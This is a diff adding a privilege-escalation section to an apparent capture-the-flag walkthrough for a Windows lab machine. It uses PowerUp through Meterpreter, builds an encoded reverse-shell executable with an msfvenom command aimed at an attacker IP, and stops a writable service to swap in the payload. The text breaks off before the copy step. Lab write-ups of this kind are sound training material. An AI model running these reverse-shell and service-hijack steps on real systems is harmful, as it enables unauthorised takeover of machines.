@@ -116,3 +116,48 @@ Remember too use forward slashes.
 
 
 **Privilege Escalation**
+
+Now that you have an initial shell on this Windows machine as Bill (enter getuid in the meterpreter shell to see this), we can further enumerate the machine and escalate our privileges to root!
+
+**Questions**
+To enumerate this machine, we will use a PowerShell script called PowerUp, whose purpose is to evaluate a Windows machine and determine any abnormalities — “PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations.” You can download the script here.
+
+Now you can use the upload command in Metasploit to upload the script. To execute this using Meterpreter, I will type load powershell into Meterpreter. Then I will enter PowerShell by entering powershell_shell:
+
+![image](https://github.com/user-attachments/assets/54f08ec1-58c4-4b47-9f21-e66635573c82)
+
+After doing this you just have to run the PowerUp Powershell script by entering:
+
+![image](https://github.com/user-attachments/assets/6b619afc-6d02-467b-89c3-c0fa9ee2e682)
+
+This gives a long list of abnormalities:
+
+![image](https://github.com/user-attachments/assets/4b9e40d4-2859-40b5-93f0-81f450b620ff)
+
+The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, and restart the service, which will run our infected program!
+
+Use msfvenom to generate a reverse shell as a Windows executable.
+
+ *msfvenom -p windows/shell_reverse_tcp LHOST=<attacker ip> LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe%* 
+
+msfvenom -p windows/shell_reverse_tcp LHOST=10.17.38.50 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe
+
+
+![image](https://github.com/user-attachments/assets/58a0d79a-3d4a-4623-b24c-e43e591b1ddb)
+Now we generated a reverse shell with the name ASCService.exe.
+
+We can now leave the Powershell shell, and use the same upload command as before:
+![image](https://github.com/user-attachments/assets/cee7565b-04f9-4657-9d46-d6a9387990f7)
+
+No we need to replace the legitimate one. Enter a regular cmd shell from your meterpreter shell by entering: shell.
+
+Before copying, we need to stop the service by entering:
+*sc stop AdvancedSystemCareService9*
+
+![image](https://github.com/user-attachments/assets/203402e6-5081-467d-baca-58d37840ffae)
+
+![image](https://github.com/user-attachments/assets/a91cefa8-cedc-441e-af35-2c7ea84e3d82)
+
+
+
+Then copy the file to the original location:
